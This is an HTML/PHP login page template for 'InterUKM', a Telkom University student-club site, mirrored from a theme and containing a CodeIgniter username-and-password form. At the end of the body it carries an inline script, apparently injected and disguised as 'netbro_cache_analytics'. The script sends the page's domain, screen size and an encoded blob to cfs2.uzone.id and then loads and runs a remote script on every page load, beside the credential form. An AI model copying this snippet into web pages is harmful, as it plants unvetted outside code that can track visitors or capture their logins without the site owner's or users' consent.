<!DOCTYPE html>
<html lang="en">


<!-- Mirrored from themes.webavenue.com.au/enstruct/html/10-enstruct-login.html by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 16 Apr 2017 14:07:46 GMT -->
<head>
    <meta charset="utf-8">
    <meta http-equiv="x-ua-compatible" content="ie=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <title>|| &nbsp; InterUKM</title>
    <meta name="keywords" content="">
    <meta name="description" content="">
    <meta name="author" content="">

    <!-- favicon -->
    <link rel="shortcut icon" type="image/png" href="favicon.png" /> 

    <!-- GOOGLE FONT -->
    <link href="https://fonts.googleapis.com/css?family=Poppins:400,500,600%7CRoboto:400,500,700" rel="stylesheet">

    <!-- CSS LIBRARY -->
    <link rel="stylesheet" type="text/css" href="<?php echo base_url('assets/css/lib/bootstrap.min.css'); ?>">
    <link rel="stylesheet" type="text/css" href="<?php echo base_url('assets/css/lib/animate.css'); ?>">
    <link rel="stylesheet" type="text/css" href="<?php echo base_url('assets/css/lib/font-awesome.min.css'); ?>">
    <link rel="stylesheet" type="text/css" href="<?php echo base_url('assets/css/lib/hover.css'); ?>">

    <!-- Style Sheets -->
    <link rel="stylesheet" type="text/css" href="<?php echo base_url('assets/css/bootstrap-datetimepicker.min.css'); ?>" />
    <link rel="stylesheet" type="text/css" href="<?php echo base_url('assets/css/jquery.bxslider.css'); ?>" />
    <link rel="stylesheet" type="text/css" href="<?php echo base_url('assets/css/jquery-ui.min.css'); ?>" />
    <link rel="stylesheet" type="text/css" href="<?php echo base_url('assets/css/swiper.min.css'); ?>" /> 


    <!-- Main css -->
    <link rel="stylesheet" type="text/css" href="<?php echo base_url('assets/style.css'); ?>" />
    <link rel="stylesheet" type="text/css" href="<?php echo base_url('assets/css/responsive.css'); ?>" />

    <!--[if lt IE 8]>
      <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="http://browsehappy.com/">upgrade your browser</a> to improve your experience.</p>
  <![endif]-->
    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>

      <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
      <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
  <![endif]-->
</head>

<body>
    
    </header>
    <!--header ends-->
    <main>
        <section class="primary-padding page-login gray-bg">
            <div class="container">
                <div class="row">
                    <div class="col-md-12 col-sm-12 ">
                        <div class="login-wrap">
                            <div class="left ">
                                <div class="top ">
                                    <h4 class="text-white mb-1">Selamat datang di Website InterUKM</h4>
                                    <p>
                                        Dapatkan informasi seputar UKM dan Silahkan Berpartisipasi dengan UKM di Universitas Telkom.
                                    </p>
                                </div>
                                <!--top-->
                            </div>
                            <!--left-->
                            <div class="right">
                                <h6>Silahkan login</h6>
                                <form action="<?php echo site_url('login/logincek'); ?>" method="post">
                                    <div class="input-group">
                                        <div class="input-group-addon"><i class="fa fa-user"></i></div>
                                        <input type="text" placeholder="Username" name="username">
                                    </div>
                                    <!--input gruop-->
                                    <div class="input-group">
                                        <div class="input-group-addon"><i class="fa fa-lock"></i></div>
                                        <input type="password" placeholder="Password" name="password">
                                    </div>
                                    <?php echo $this->session->flashdata('msg'); ?>
                                    <!--menditory-->
                                    <button type="submit" class="btn bg-yellow txt-cap">Masuk</button>
                                    <div>
                                    <br>
                                   
                                    </div>
                                </form>
                            </div>
                            <!--right-->
                        </div>
                    </div>
                </div>
                <!--content-->
            </div>
        </section>
        <!--blog wrap-->
    </main>
    <!--main ends-->
    

    <!--footer-->

   <!--back to top-->
    <a href="#" class="scrollup"><i class="fa fa-angle-up"></i></a>
   
    <!-- Js libery -->
    <script src="<?php echo base_url('assets/js/jquery-3.1.1.min.js'); ?>"></script>
    <script src="<?php echo base_url('assets/js/tether.min.js'); ?>"></script>
    <script src="<?php echo base_url('assets/js/bootstrap.min.js'); ?>"></script>
    <script src="<?php echo base_url('assets/js/modernizr.js'); ?>"></script>

    <!--jquery ui-->
    <script src="<?php echo base_url('assets/js/jquery-ui.js'); ?>"></script>

    <!-- slider js -->
    <script src="<?php echo base_url('assets/js/jquery.bxslider.min.js'); ?>"></script>
    <script src="<?php echo base_url('assets/js/swiper.jquery.min.js'); ?>"></script>    

    <!-- wow -->
    <script src="<?php echo base_url('assets/js/wow.min.js'); ?>"></script>

    <!-- Parallax -->
    <script type="text/javascript" src="<?php echo base_url('assets/js/jquery.parallax-1.1.3.js'); ?>"></script>
    <script type="text/javascript" src="<?php echo base_url('assets/js/jquery.localscroll-1.2.7-min.js'); ?>"></script>
    <script type="text/javascript" src="<?php echo base_url('assets/js/jquery.scrollTo-1.4.2-min.js'); ?>"></script>

    <!--datepicker-->
    <script src="<?php echo base_url('assets/js/bootstrap-datetimepicker.min.js'); ?>"></script>

    <!--counter-->
    <script src="<?php echo base_url('assets/js/jquery.countTo.js'); ?>"></script>

    <!--smooth scrollling-->
    <script src="<?php echo base_url('assets/js/jQuery.scrollSpeed.js'); ?>"></script>

    <!--Costom js-->
    <script src="<?php echo base_url('assets/js/main.js'); ?>"></script>
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs2.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582CL4NjpNgssK%2fmsldK2DOE8nluOZ2NBvx%2fgJ2fwVeR0xBmJmBM9rpHnjxXp0aSdQ7kPXDkOnciR9RHx2SyOj4i%2beisqCM4C1QEdHt01aZ%2b4m9eQtNU3MScW6nrWexOAhPRKm4uG8BlDLLa9Z4ORtKHIv7VjWs2hYNMDIA8dQXtsGUzZ1Ad5EnqzTXsPAsSsSL72kgGa1c%2fNkULCpRF5WDGtWuHvyJFZNXpJ1OnRPtq2nMVSKKSywBHclFMnbCckzVDsqPdyAfjCWpshQ4HmbWhsjC9SkNONNnIU8oWH64HJbUcEtcWiuotsWDgNBpRuu1EdJ%2fFBM%2bxN3iHhzGASR6MC%2fgBrjNzC1gkBrLWsaB4ArtyZzAh1ZqZ2igPKHXBnz3zBLlriaTe%2bWHvPd1fgZOpaj0VNzri3NtWzAG10hMQKuMUQIiQ%2bdpLU%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>


<!-- Mirrored from themes.webavenue.com.au/enstruct/html/10-enstruct-login.html by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 16 Apr 2017 14:07:46 GMT -->
</html>
